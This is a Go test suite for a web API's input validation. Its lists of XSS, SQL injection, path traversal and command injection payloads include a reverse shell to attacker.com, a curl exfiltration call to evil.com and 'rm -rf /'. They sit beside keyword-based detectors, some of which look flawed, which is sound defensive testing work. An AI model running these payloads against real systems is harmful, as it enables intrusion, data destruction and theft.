package validation

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/suite"
)

// InputValidationTestSuite tests input validation security
type InputValidationTestSuite struct {
	suite.Suite
	router *gin.Engine
}

func (suite *InputValidationTestSuite) SetupSuite() {
	gin.SetMode(gin.TestMode)
	suite.router = gin.New()
	suite.setupRoutes()
}

// payloadSizeLimitMiddleware rejects requests with body larger than maxSize
func payloadSizeLimitMiddleware(maxSize int64) gin.HandlerFunc {
	return func(c *gin.Context) {
		if c.Request.ContentLength > maxSize {
			c.AbortWithStatusJSON(http.StatusRequestEntityTooLarge, gin.H{
				"error": "Request body too large",
			})
			return
		}
		c.Next()
	}
}

func (suite *InputValidationTestSuite) setupRoutes() {
	// Add payload size limit middleware (1MB limit)
	suite.router.Use(payloadSizeLimitMiddleware(1 * 1024 * 1024))

	// Mock API endpoints for testing
	api := suite.router.Group("/api/v1")
	{
		api.POST("/tokens", suite.mockTokenHandler)
		api.POST("/swap", suite.mockSwapHandler)
		api.POST("/pools", suite.mockPoolHandler)
		api.GET("/search", suite.mockSearchHandler)
		api.POST("/user/profile", suite.mockProfileHandler)
	}
}

// Test invalid token addresses
func (suite *InputValidationTestSuite) TestInvalidTokenAddresses() {
	testCases := []struct {
		name     string
		address  string
		expected int
	}{
		{"Empty address", "", http.StatusBadRequest},
		{"Invalid hex", "0xInvalidHex", http.StatusBadRequest},
		{"Wrong length", "0x123", http.StatusBadRequest},
		{"No 0x prefix", "1234567890123456789012345678901234567890", http.StatusBadRequest},
		{"Too long", "0x12345678901234567890123456789012345678901234567890", http.StatusBadRequest},
		{"SQL injection attempt", "0x'; DROP TABLE tokens; --", http.StatusBadRequest},
		{"XSS attempt", "<script>alert('xss')</script>", http.StatusBadRequest},
		{"Null bytes", "0x1234567890123456789012345678901234567890\x00", http.StatusBadRequest},
		{"Unicode normalization", "0x１２３４５６７８９０１２３４５６７８９０１２３４５６７８９０１２３４５６７８９０", http.StatusBadRequest},
	}

	for _, tc := range testCases {
		suite.Run(tc.name, func() {
			payload := map[string]interface{}{
				"address": tc.address,
				"symbol":  "TEST",
				"name":    "Test Token",
			}

			body, _ := json.Marshal(payload)
			req := httptest.NewRequest("POST", "/api/v1/tokens", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			suite.router.ServeHTTP(w, req)
			assert.Equal(suite.T(), tc.expected, w.Code)
		})
	}
}

// Test invalid amount formats
func (suite *InputValidationTestSuite) TestInvalidAmountFormats() {
	testCases := []struct {
		name     string
		amount   interface{}
		expected int
	}{
		{"Negative amount", "-100", http.StatusBadRequest},
		{"Zero amount", "0", http.StatusBadRequest},
		{"Float with too many decimals", "123.123456789012345678901", http.StatusBadRequest},
		{"Scientific notation", "1e18", http.StatusBadRequest},
		{"Non-numeric string", "abc", http.StatusBadRequest},
		{"Empty string", "", http.StatusBadRequest},
		{"Null value", nil, http.StatusBadRequest},
		{"Boolean value", true, http.StatusBadRequest},
		{"Array value", []string{"100"}, http.StatusBadRequest},
		{"Object value", map[string]string{"amount": "100"}, http.StatusBadRequest},
		{"Extremely large number", "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999", http.StatusBadRequest},
		{"Hex number", "0x64", http.StatusBadRequest},
		{"Binary number", "0b1100100", http.StatusBadRequest},
		{"Octal number", "0o144", http.StatusBadRequest},
	}

	for _, tc := range testCases {
		suite.Run(tc.name, func() {
			payload := map[string]interface{}{
				"tokenIn":  "0x1234567890123456789012345678901234567890",
				"tokenOut": "0x0987654321098765432109876543210987654321",
				"amountIn": tc.amount,
				"slippage": "0.5",
			}

			body, _ := json.Marshal(payload)
			req := httptest.NewRequest("POST", "/api/v1/swap", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			suite.router.ServeHTTP(w, req)
			assert.Equal(suite.T(), tc.expected, w.Code)
		})
	}
}

// Test XSS prevention in text fields
func (suite *InputValidationTestSuite) TestXSSPrevention() {
	xssPayloads := []string{
		"<script>alert('xss')</script>",
		"javascript:alert('xss')",
		"<img src=x onerror=alert('xss')>",
		"<svg onload=alert('xss')>",
		"<iframe src=javascript:alert('xss')></iframe>",
		"<object data=javascript:alert('xss')></object>",
		"<embed src=javascript:alert('xss')></embed>",
		"<link rel=stylesheet href=javascript:alert('xss')>",
		"<style>@import 'javascript:alert(\"xss\")'</style>",
		"<meta http-equiv=refresh content=0;url=javascript:alert('xss')>",
		"<form><button formaction=javascript:alert('xss')>Click</button></form>",
		"<input type=image src=x onerror=alert('xss')>",
		"<video><source onerror=alert('xss')>",
		"<audio src=x onerror=alert('xss')>",
		"<details open ontoggle=alert('xss')>",
		"<marquee onstart=alert('xss')>",
		"<body onload=alert('xss')>",
		"<div onmouseover=alert('xss')>",
		"<span onclick=alert('xss')>",
		"<a href=javascript:alert('xss')>Click</a>",
	}

	for i, payload := range xssPayloads {
		suite.Run(fmt.Sprintf("XSS_Payload_%d", i+1), func() {
			requestPayload := map[string]interface{}{
				"name":        payload,
				"description": payload,
				"bio":         payload,
			}

			body, _ := json.Marshal(requestPayload)
			req := httptest.NewRequest("POST", "/api/v1/user/profile", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			suite.router.ServeHTTP(w, req)
			assert.Equal(suite.T(), http.StatusBadRequest, w.Code)

			// Ensure the payload is not reflected in the response
			responseBody := w.Body.String()
			assert.NotContains(suite.T(), responseBody, payload)
		})
	}
}

// Test SQL injection prevention
func (suite *InputValidationTestSuite) TestSQLInjectionPrevention() {
	sqlInjectionPayloads := []string{
		"'; DROP TABLE users; --",
		"' OR '1'='1",
		"' OR 1=1 --",
		"' UNION SELECT * FROM users --",
		"'; INSERT INTO users VALUES ('hacker', 'password'); --",
		"' OR EXISTS(SELECT * FROM users) --",
		"'; UPDATE users SET password='hacked' WHERE id=1; --",
		"' AND (SELECT COUNT(*) FROM users) > 0 --",
		"'; EXEC xp_cmdshell('dir'); --",
		"' OR SLEEP(5) --",
		"'; WAITFOR DELAY '00:00:05'; --",
		"' OR BENCHMARK(1000000,MD5(1)) --",
		"' OR pg_sleep(5) --",
		"'; SELECT * FROM information_schema.tables; --",
		"' UNION ALL SELECT NULL,NULL,NULL,version() --",
	}

	for i, payload := range sqlInjectionPayloads {
		suite.Run(fmt.Sprintf("SQL_Injection_%d", i+1), func() {
			req := httptest.NewRequest("GET", fmt.Sprintf("/api/v1/search?q=%s", payload), nil)
			w := httptest.NewRecorder()

			suite.router.ServeHTTP(w, req)
			assert.Equal(suite.T(), http.StatusBadRequest, w.Code)
		})
	}
}

// Test path traversal prevention
func (suite *InputValidationTestSuite) TestPathTraversalPrevention() {
	pathTraversalPayloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"....//....//....//etc/passwd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"\\..\\..\\..\\etc\\passwd",
		"file:///etc/passwd",
		"/var/log/../../etc/passwd",
		"C:\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
	}

	for i, payload := range pathTraversalPayloads {
		suite.Run(fmt.Sprintf("Path_Traversal_%d", i+1), func() {
			req := httptest.NewRequest("GET", fmt.Sprintf("/api/v1/search?file=%s", payload), nil)
			w := httptest.NewRecorder()

			suite.router.ServeHTTP(w, req)
			assert.Equal(suite.T(), http.StatusBadRequest, w.Code)
		})
	}
}

// Test command injection prevention
func (suite *InputValidationTestSuite) TestCommandInjectionPrevention() {
	cmdInjectionPayloads := []string{
		"; ls -la",
		"| cat /etc/passwd",
		"&& rm -rf /",
		"`whoami`",
		"$(id)",
		"; ping -c 4 google.com",
		"| nc -l 4444",
		"&& curl http://evil.com/steal?data=",
		"; python -c 'import os; os.system(\"ls\")'",
		"| bash -i >& /dev/tcp/attacker.com/4444 0>&1",
	}

	for i, payload := range cmdInjectionPayloads {
		suite.Run(fmt.Sprintf("Command_Injection_%d", i+1), func() {
			requestPayload := map[string]interface{}{
				"command": payload,
				"args":    []string{payload},
			}

			body, _ := json.Marshal(requestPayload)
			req := httptest.NewRequest("POST", "/api/v1/search", bytes.NewBuffer(body))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			suite.router.ServeHTTP(w, req)
			assert.Equal(suite.T(), http.StatusBadRequest, w.Code)
		})
	}
}

// Test header injection prevention
func (suite *InputValidationTestSuite) TestHeaderInjectionPrevention() {
	headerInjectionPayloads := []string{
		"test\r\nX-Injected: true",
		"test\nSet-Cookie: admin=true",
		"test\r\n\r\n<script>alert('xss')</script>",
		"test\x0d\x0aLocation: http://evil.com",
		"test\u000d\u000aX-Forwarded-For: 127.0.0.1",
	}

	for i, payload := range headerInjectionPayloads {
		suite.Run(fmt.Sprintf("Header_Injection_%d", i+1), func() {
			req := httptest.NewRequest("GET", "/api/v1/search", nil)
			req.Header.Set("X-Custom-Header", payload)
			w := httptest.NewRecorder()

			suite.router.ServeHTTP(w, req)

			// Check that injected headers are not present
			assert.Empty(suite.T(), w.Header().Get("X-Injected"))
			assert.Empty(suite.T(), w.Header().Get("Set-Cookie"))
			assert.Empty(suite.T(), w.Header().Get("Location"))
		})
	}
}

// Test JSON payload size limits
func (suite *InputValidationTestSuite) TestJSONPayloadSizeLimits() {
	// Test extremely large JSON payload
	largeString := strings.Repeat("A", 10*1024*1024) // 10MB string
	payload := map[string]interface{}{
		"data": largeString,
	}

	body, _ := json.Marshal(payload)
	req := httptest.NewRequest("POST", "/api/v1/tokens", bytes.NewBuffer(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()

	suite.router.ServeHTTP(w, req)
	assert.Equal(suite.T(), http.StatusRequestEntityTooLarge, w.Code)
}

// Test malformed JSON
func (suite *InputValidationTestSuite) TestMalformedJSON() {
	malformedJSONs := []string{
		"{invalid json}",
		"{\"key\": }",
		"{\"key\": \"value\",}",
		"[{\"key\": \"value\"}]",
		"null",
		"undefined",
		"",
		"   ",
		"\x00\x01\x02",
	}

	for i, malformedJSON := range malformedJSONs {
		suite.Run(fmt.Sprintf("Malformed_JSON_%d", i+1), func() {
			req := httptest.NewRequest("POST", "/api/v1/tokens", strings.NewReader(malformedJSON))
			req.Header.Set("Content-Type", "application/json")
			w := httptest.NewRecorder()

			suite.router.ServeHTTP(w, req)
			assert.Equal(suite.T(), http.StatusBadRequest, w.Code)
		})
	}
}

// Mock handlers for testing
func (suite *InputValidationTestSuite) mockTokenHandler(c *gin.Context) {
	var req map[string]interface{}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
		return
	}

	// Validate address
	address, ok := req["address"].(string)
	if !ok || !isValidEthereumAddress(address) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid address"})
		return
	}

	// Check for XSS in text fields
	for _, field := range []string{"symbol", "name"} {
		if value, exists := req[field]; exists {
			if str, ok := value.(string); ok && containsXSS(str) {
				c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid input detected"})
				return
			}
		}
	}

	c.JSON(http.StatusOK, gin.H{"message": "Token created"})
}

func (suite *InputValidationTestSuite) mockSwapHandler(c *gin.Context) {
	var req map[string]interface{}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
		return
	}

	// Validate amount
	amount, ok := req["amountIn"].(string)
	if !ok || !isValidAmount(amount) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid amount"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"message": "Swap executed"})
}

func (suite *InputValidationTestSuite) mockPoolHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"message": "Pool created"})
}

func (suite *InputValidationTestSuite) mockSearchHandler(c *gin.Context) {
	query := c.Query("q")
	file := c.Query("file")

	// Check for SQL injection
	if containsSQLInjection(query) || containsPathTraversal(file) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid query"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"results": []string{}})
}

func (suite *InputValidationTestSuite) mockProfileHandler(c *gin.Context) {
	var req map[string]interface{}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON"})
		return
	}

	// Check for XSS in all text fields
	for _, field := range []string{"name", "description", "bio"} {
		if value, exists := req[field]; exists {
			if str, ok := value.(string); ok && containsXSS(str) {
				c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid input detected"})
				return
			}
		}
	}

	c.JSON(http.StatusOK, gin.H{"message": "Profile updated"})
}

// Helper functions for validation
func isValidEthereumAddress(address string) bool {
	if len(address) != 42 {
		return false
	}
	if !strings.HasPrefix(address, "0x") {
		return false
	}
	for _, char := range address[2:] {
		if !((char >= '0' && char <= '9') || (char >= 'a' && char <= 'f') || (char >= 'A' && char <= 'F')) {
			return false
		}
	}
	return true
}

func isValidAmount(amount string) bool {
	if amount == "" || amount == "0" {
		return false
	}
	if strings.HasPrefix(amount, "-") {
		return false
	}
	// Check for scientific notation, hex, binary, octal
	if strings.Contains(amount, "e") || strings.Contains(amount, "E") ||
		strings.HasPrefix(amount, "0x") || strings.HasPrefix(amount, "0b") || strings.HasPrefix(amount, "0o") {
		return false
	}
	// Check for extremely large numbers
	if len(amount) > 50 {
		return false
	}
	return true
}

func containsXSS(input string) bool {
	xssPatterns := []string{
		"<script", "</script>", "javascript:", "<img", "onerror=", "onload=",
		"<iframe", "<object", "<embed", "<link", "<style", "<meta",
		"<form", "<input", "<video", "<audio", "<details", "<marquee",
		"<body", "<div", "<span", "onclick=", "onmouseover=", "<svg",
	}
	lowerInput := strings.ToLower(input)
	for _, pattern := range xssPatterns {
		if strings.Contains(lowerInput, pattern) {
			return true
		}
	}
	return false
}

func containsSQLInjection(input string) bool {
	sqlPatterns := []string{
		"'", "--", ";", "union", "select", "insert", "update", "delete",
		"drop", "exec", "xp_", "sp_", "waitfor", "benchmark", "sleep",
		"information_schema", "pg_sleep", "or 1=1", "or '1'='1",
	}
	lowerInput := strings.ToLower(input)
	for _, pattern := range sqlPatterns {
		if strings.Contains(lowerInput, pattern) {
			return true
		}
	}
	return false
}

func containsPathTraversal(input string) bool {
	pathPatterns := []string{
		"../", "..\\", "%2e%2e", "....//", "%252f", "%c0%af",
		"file://", "/etc/", "/var/", "C:\\", "\\windows\\",
	}
	lowerInput := strings.ToLower(input)
	for _, pattern := range pathPatterns {
		if strings.Contains(lowerInput, pattern) {
			return true
		}
	}
	return false
}

func TestInputValidationSuite(t *testing.T) {
	suite.Run(t, new(InputValidationTestSuite))
}
